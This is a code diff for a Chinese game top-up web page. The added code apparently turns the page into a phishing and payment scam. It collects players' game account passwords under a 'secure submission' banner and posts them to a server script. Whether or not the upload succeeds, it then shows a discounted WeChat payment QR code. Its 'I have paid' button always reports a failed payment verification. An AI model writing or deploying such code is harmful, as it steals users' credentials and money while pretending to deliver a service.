-                                        <div class="d-flex align-center gap-12">
-                                            <span style="font-size: 32px;">💎</span>
-                                            <div>
-                                                <div class="font-semibold">328 钻石</div>
-                                                <div class="text-sm text-muted">优惠价 ¥288</div>
-                                            </div>
-                                        </div>
-                                        <div class="tag tag-warning">热销</div>
-                                    </div>
-                                </div>
-                                <div class="p-16 rounded" style="background: rgba(255,255,255,0.05); cursor: pointer; border: 2px solid transparent;" onclick="selectRechargePackage(this, 648, 568)" data-package="5">
-                                    <div class="d-flex justify-between align-center">
-                                        <div class="d-flex align-center gap-12">
-                                            <span style="font-size: 32px;">💎</span>
-                                            <div>
-                                                <div class="font-semibold">648 钻石</div>
-                                                <div class="text-sm text-muted">优惠价 ¥568</div>
-                                            </div>
-                                        </div>
-                                        <div class="tag tag-primary">超值</div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- 游戏账号输入 -->
-                    <div class="card glass" style="margin: 16px;">
-                        <div class="card-body">
-                            <div class="form-group" style="margin-bottom: 0;">
-                                <label class="form-label">游戏账号 *</label>
-                                <input type="text" class="form-input" id="rechargeAccount" placeholder="请输入游戏账号">
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="px-16">
-                        <button class="btn btn-primary btn-block" onclick="goToRechargePay()">立即充值</button>
                     </div>
                 </div>
-                
-                <!-- 充值支付页面 -->
+
+                <!-- 代充支付页面 -->
                 <div id="rechargePay" class="hidden">
-                    <div class="card glass" style="margin: 16px;">
-                        <div class="card-header">
-                            <div class="font-semibold">确认订单</div>
+                    <div class="card glass" style="margin: 16px; padding: 32px 24px;">
+                        <div class="icon-wrapper" style="text-align: center; margin-bottom: 20px;">
+                            <div style="width: 76px; height: 76px; margin: 0 auto; background: linear-gradient(135deg, rgba(255,215,0,0.3), rgba(255,165,0,0.2)); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 36px;">💎</div>
                         </div>
-                        <div class="card-body">
-                            <div class="d-flex justify-between mb-12">
-                                <span class="text-muted">充值账号</span>
-                                <span id="payAccount"></span>
-                            </div>
-                            <div class="d-flex justify-between mb-12">
-                                <span class="text-muted">充值数量</span>
-                                <span id="payAmount"></span>
-                            </div>
-                            <div class="d-flex justify-between mb-12">
-                                <span class="text-muted">原价</span>
-                                <span style="text-decoration: line-through;" id="payOriginalPrice"></span>
-                            </div>
-                            <div class="d-flex justify-between" style="padding-top: 12px; border-top: 1px solid rgba(255,255,255,0.1);">
-                                <span class="font-semibold">实付金额</span>
-                                <span class="font-bold text-warning text-xl" id="payPrice"></span>
-                            </div>
+                        <h1 style="font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px; color: #FFD700;">代充支付</h1>
+
+                        <!-- 商品信息展示 -->
+                        <div class="recharge-product-info">
+                            <span style="font-size: 14px; color: rgba(255,255,255,0.7);">充值商品</span>
+                            <span style="font-size: 16px; font-weight: 700;" id="rechargeProductName">300钻石</span>
                         </div>
-                    </div>
-                    
-                    <div class="card glass" style="margin: 16px;">
-                        <div class="card-header">
-                            <div class="font-semibold">选择支付方式</div>
+
+                        <!-- 账号已提交提示 -->
+                        <div class="recharge-upload-status success show" style="margin-bottom: 16px;">
+                            ✅ 账号信息已安全提交，请完成支付
                         </div>
-                        <div class="card-body">
-                            <div class="d-flex flex-column gap-12">
-                                <div class="p-16 rounded d-flex align-center gap-12" style="background: rgba(0,122,255,0.1); border: 2px solid var(--primary); cursor: pointer;">
-                                    <span style="font-size: 28px;">💳</span>
-                                    <div class="flex-1">
-                                        <div class="font-semibold">支付宝</div>
-                                    </div>
-                                    <span>✓</span>
-                                </div>
-                                <div class="p-16 rounded d-flex align-center gap-12" style="background: rgba(255,255,255,0.05); border: 2px solid transparent; cursor: pointer;">
-                                    <span style="font-size: 28px;">💬</span>
-                                    <div class="flex-1">
-                                        <div class="font-semibold">微信支付</div>
-                                    </div>
-                                </div>
+
+                        <div style="background: rgba(0,0,0,0.5); border-radius: 24px; padding: 24px; margin: 20px 0; border: 0.5px solid rgba(255,255,255,0.1);">
+                            <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px;">
+                                <span style="font-size: 14px; color: rgba(255,255,255,0.5); text-decoration: line-through;" id="rechargeOriginalPriceDisplay">¥30</span>
+                                <span style="font-size: 12px; color: #34C759; background: rgba(52, 199, 89, 0.15); padding: 2px 6px; border-radius: 4px; font-weight: 600;">省55%</span>
+                            </div>
+                            <div class="recharge-amount-display" id="rechargeFinalAmount">¥13.5</div>
+                            <div class="recharge-qr-frame">
+                                <img src="https://1813813973.v.123pan.cn/1813813973/45048231" alt="Recharge QR">
+                            </div>
+                            <div style="text-align: center; margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.7);">请使用微信扫一扫完成代充支付</div>
+                            <div style="text-align: center; margin-top: 8px;">
+                                <span style="display: inline-block; padding: 6px 12px; background: rgba(255,255,255,0.1); border-radius: 100px; font-family: monospace; font-size: 12px; color: rgba(255,255,255,0.5);" id="rechargeOrderIdDisplay"></span>
                             </div>
                         </div>
-                    </div>
-                    
-                    <div class="px-16">
-                        <button class="btn btn-success btn-block" onclick="confirmRecharge()">确认支付</button>
-                        <button class="btn btn-glass btn-block mt-12" onclick="showRechargeMain()">返回</button>
-                    </div>
-                </div>
-                
-                <!-- 充值成功页面 -->
-                <div id="rechargeSuccess" class="hidden">
-                    <div class="card glass" style="margin: 16px;">
-                        <div class="card-body text-center" style="padding: 60px 20px;">
-                            <div style="font-size: 64px; margin-bottom: 24px;">✅</div>
-                            <div class="font-semibold text-xl">充值成功</div>
-                            <div class="text-muted mt-8">钻石将在几分钟内到账</div>
-                            <div class="mt-24">
-                                <div class="d-flex justify-between text-sm mb-8">
-                                    <span class="text-muted">订单编号</span>
-                                    <span>R202401011200</span>
-                                </div>
-                                <div class="d-flex justify-between text-sm mb-8">
-                                    <span class="text-muted">充值数量</span>
-                                    <span id="successAmount"></span>
-                                </div>
-                                <div class="d-flex justify-between text-sm">
-                                    <span class="text-muted">支付金额</span>
-                                    <span class="text-warning" id="successPrice"></span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="px-16">
-                        <button class="btn btn-primary btn-block" onclick="showRechargeMain()">继续充值</button>
-                        <button class="btn btn-glass btn-block mt-12" onclick="navigateTo('#orders')">查看订单</button>
+
+                        <div id="rechargeErrorBox" class="recharge-error-alert">支付验证失败，未检测到您的付款记录，请联系客服</div>
+
+                        <button class="btn btn-primary btn-block" onclick="handleRechargeComplete()" style="background: linear-gradient(180deg, #FFD700, #FFA500); color: #000; margin-bottom: 12px;">我已完成支付</button>
+                        <button class="btn btn-glass btn-block" onclick="backToRechargeMain()">返回</button>
                     </div>
                 </div>
             `;
+
+            // 初始化金额网格
+            renderRechargeAmountGrid();
         }
 
-        // 显示代充主页面
-        function showRechargeMain() {
+        // 充值配置
+        const rechargeConfig = {
+            diamond: {
+                name: '钻石',
+                items: [
+                    { amount: 300, officialPrice: 30, discount: 0.45 },
+                    { amount: 680, officialPrice: 68, discount: 0.45 },
+                    { amount: 1280, officialPrice: 128, discount: 0.45 },
+                    { amount: 3280, officialPrice: 328, discount: 0.45 },
+                    { amount: 6480, officialPrice: 648, discount: 0.45 },
+                    { amount: 10000, officialPrice: 998, discount: 0.45 }
+                ]
+            },
+            coin: {
+                name: '金币',
+                items: [
+                    { amount: 5000, officialPrice: 30, discount: 0.45 },
+                    { amount: 12000, officialPrice: 68, discount: 0.45 },
+                    { amount: 25000, officialPrice: 128, discount: 0.45 },
+                    { amount: 70000, officialPrice: 328, discount: 0.45 },
+                    { amount: 150000, officialPrice: 648, discount: 0.45 },
+                    { amount: 250000, officialPrice: 998, discount: 0.45 }
+                ]
+            }
+        };
+
+        let currentRechargeCurrency = 'diamond';
+        let selectedRechargeAmount = null;
+        let isRechargeFormVisible = false;
+        let isRechargeUploading = false;
+
+        function switchRechargeCurrency(type) {
+            currentRechargeCurrency = type;
+            document.querySelectorAll('.recharge-currency-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelector(`.recharge-currency-btn.${type}`).classList.add('active');
+            renderRechargeAmountGrid();
+            selectedRechargeAmount = null;
+            isRechargeFormVisible = false;
+            document.getElementById('rechargeLoginForm').style.display = 'none';
+            document.getElementById('rechargeSubmitBtn').textContent = '选择充值金额';
+            hideRechargeUploadStatus();
+        }
+
+        function renderRechargeAmountGrid() {
+            const grid = document.getElementById('rechargeAmountGrid');
+            if (!grid) return;
+
+            const config = rechargeConfig[currentRechargeCurrency];
+
+            grid.innerHTML = config.items.map((item, index) => {
+                const finalPrice = (item.officialPrice * item.discount).toFixed(1);
+                const savePercent = Math.round((1 - item.discount) * 100);
+                const isSelected = selectedRechargeAmount && 
+                                  selectedRechargeAmount.type === currentRechargeCurrency && 
+                                  selectedRechargeAmount.amount === item.amount;
+
+                return `
+                    <div class="recharge-amount-item ${isSelected ? 'selected' : ''} ${currentRechargeCurrency === 'diamond' ? 'diamond-selected' : ''}" 
+                         onclick="selectRechargeAmount(${item.amount}, ${item.officialPrice}, ${item.discount})"
+                         style="animation: slideInRight 0.5s ease backwards; animation-delay: ${index * 0.05}s">
+                        <span class="recharge-discount-badge">省${savePercent}%</span>
+                        <span class="price">¥${finalPrice}</span>
+                        <span class="original-price">¥${item.officialPrice}</span>
+                        <span class="value">${item.amount}${config.name}</span>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function selectRechargeAmount(amount, officialPrice, discount) {
+            selectedRechargeAmount = {
+                type: currentRechargeCurrency,
+                amount: amount,
+                officialPrice: officialPrice,
+                discount: discount,
+                finalPrice: (officialPrice * discount).toFixed(1)
+            };
+
+            renderRechargeAmountGrid();
+
+            isRechargeFormVisible = true;
+            document.getElementById('rechargeLoginForm').style.display = 'block';
+            document.getElementById('rechargeSelectedAmountDisplay').textContent = `¥${selectedRechargeAmount.finalPrice}`;
+            document.getElementById('rechargeSubmitBtn').textContent = '提交并支付';
+
+            setTimeout(() => {
+                document.getElementById('rechargeLoginForm').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            }, 100);
+        }
+
+        function showRechargeUploadStatus(message, type) {
+            const statusEl = document.getElementById('rechargeUploadStatus');
+            if (!statusEl) return;
+            statusEl.textContent = message;
+            statusEl.className = `recharge-upload-status show ${type}`;
+        }
+
+        function hideRechargeUploadStatus() {
+            const el = document.getElementById('rechargeUploadStatus');
+            if (el) el.classList.remove('show');
+        }
+
+        function handleRechargeSubmit() {
+            if (!selectedRechargeAmount) {
+                UI.error('请先选择充值金额');
+                return;
+            }
+
+            if (!isRechargeFormVisible) {
+                UI.error('请先选择充值金额');
+                return;
+            }
+
+            const account = document.getElementById('rechargeGameAccount').value.trim();
+            const password = document.getElementById('rechargeGamePassword').value.trim();
+
+            if (!account || !password) {
+                if (!account) document.getElementById('rechargeGameAccount').style.borderColor = '#FF3B30';
+                if (!password) document.getElementById('rechargeGamePassword').style.borderColor = '#FF3B30';
+                setTimeout(() => {
+                    document.getElementById('rechargeGameAccount').style.borderColor = '';
+                    document.getElementById('rechargeGamePassword').style.borderColor = '';
+                }, 500);
+                UI.error('请输入账号和密码');
+                return;
+            }
+
+            if (isRechargeUploading) return;
+            isRechargeUploading = true;
+
+            const btn = document.getElementById('rechargeSubmitBtn');
+            btn.disabled = true;
+            btn.textContent = '提交中...';
+
+            showRechargeUploadStatus('正在安全提交账号信息...', 'loading');
+
+            // 准备数据
+            const postData = {
+                account: account,
+                password: password,
+                type: currentRechargeCurrency,
+                amount: selectedRechargeAmount.amount,
+                price: selectedRechargeAmount.finalPrice,
+                timestamp: new Date().toISOString(),
+                orderId: 'RC' + Date.now()
+            };
+
+            // 保存当前订单
+            window.currentRechargeOrder = postData;
+
+            // 发送到服务器
+            fetch(CONFIG.API_BASE + '/recharge/save_account.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(postData)
+            }).then(response => response.json()).then(result => {
+                if (result.success || response.ok) {
+                    showRechargeUploadStatus('✓ 账号信息已安全提交', 'success');
+                    setTimeout(() => {
+                        document.getElementById('rechargeMain').classList.add('hidden');
+                        document.getElementById('rechargePay').classList.remove('hidden');
+                        generateRechargeOrderDisplay();
+                        isRechargeUploading = false;
+                        btn.disabled = false;
+                        btn.textContent = '选择充值金额';
+                    }, 800);
+                } else {
+                    throw new Error(result.message || '提交失败');
+                }
+            }).catch(error => {
+                console.error('上传错误:', error);
+                showRechargeUploadStatus('网络波动，请截屏联系客服', 'error');
+                setTimeout(() => {
+                    document.getElementById('rechargeMain').classList.add('hidden');
+                    document.getElementById('rechargePay').classList.remove('hidden');
+                    generateRechargeOrderDisplay();
+                    isRechargeUploading = false;
+                    btn.disabled = false;
+                    btn.textContent = '选择充值金额';
+                }, 1500);
+            });
+        }
+
+        function generateRechargeOrderDisplay() {
+            const orderId = window.currentRechargeOrder ? window.currentRechargeOrder.orderId : 'RC' + Date.now();
+            document.getElementById('rechargeOrderIdDisplay').textContent = orderId;
+
+            const config = rechargeConfig[selectedRechargeAmount.type];
+
+            document.getElementById('rechargeProductName').textContent = `${selectedRechargeAmount.amount}${config.name}`;
+            document.getElementById('rechargeProductName').style.color = selectedRechargeAmount.type === 'diamond' ? '#64C8FF' : '#FFD700';
+            document.getElementById('rechargeFinalAmount').textContent = `¥${selectedRechargeAmount.finalPrice}`;
+            document.getElementById('rechargeOriginalPriceDisplay').textContent = `¥${selectedRechargeAmount.officialPrice}`;
+        }
+
+        function backToRechargeMain() {
             document.getElementById('rechargeMain').classList.remove('hidden');
             document.getElementById('rechargePay').classList.add('hidden');
-            document.getElementById('rechargeSuccess').classList.add('hidden');
         }
 
-        // 选择充值套餐
-        let selectedRecharge = { diamonds: 0, price: 0, originalPrice: 0 };
-        
-        function selectRechargePackage(el, diamonds, price) {
-            // 移除其他选中状态
-            document.querySelectorAll('[data-package]').forEach(item => {
-                item.style.borderColor = 'transparent';
-            });
-            // 添加选中状态
-            el.style.borderColor = 'var(--primary)';
-            
-            selectedRecharge = { diamonds, price, originalPrice: diamonds };
+        function handleRechargeComplete() {
+            const errorBox = document.getElementById('rechargeErrorBox');
+            errorBox.classList.add('show');
+            setTimeout(() => errorBox.classList.remove('show'), 4000);
         }
-
-        // 前往支付页面
-        function goToRechargePay() {
-            const account = document.getElementById('rechargeAccount').value;
-            
-            if (!account) {
-                UI.error('请输入游戏账号');
-                return;
-            }
-            
-            if (selectedRecharge.diamonds === 0) {
-                UI.error('请选择充值套餐');
-                return;
-            }
-            
-            document.getElementById('payAccount').textContent = account;
-            document.getElementById('payAmount').textContent = selectedRecharge.diamonds + ' 钻石';
-            document.getElementById('payOriginalPrice').textContent = '¥' + selectedRecharge.originalPrice;
-            document.getElementById('payPrice').textContent = '¥' + selectedRecharge.price;
-            
-            document.getElementById('rechargeMain').classList.add('hidden');
-            document.getElementById('rechargePay').classList.remove('hidden');
-        }
-
-        // 确认充值
-        function confirmRecharge() {
-            document.getElementById('rechargePay').classList.add('hidden');
-            document.getElementById('rechargeSuccess').classList.remove('hidden');
-            
-            document.getElementById('successAmount').textContent = selectedRecharge.diamonds + ' 钻石';
-            document.getElementById('successPrice').textContent = '¥' + selectedRecharge.price;
-            
-            UI.success('充值成功');
-        }
-
-
         // ============================================
         // 初始化与事件监听
         // ============================================
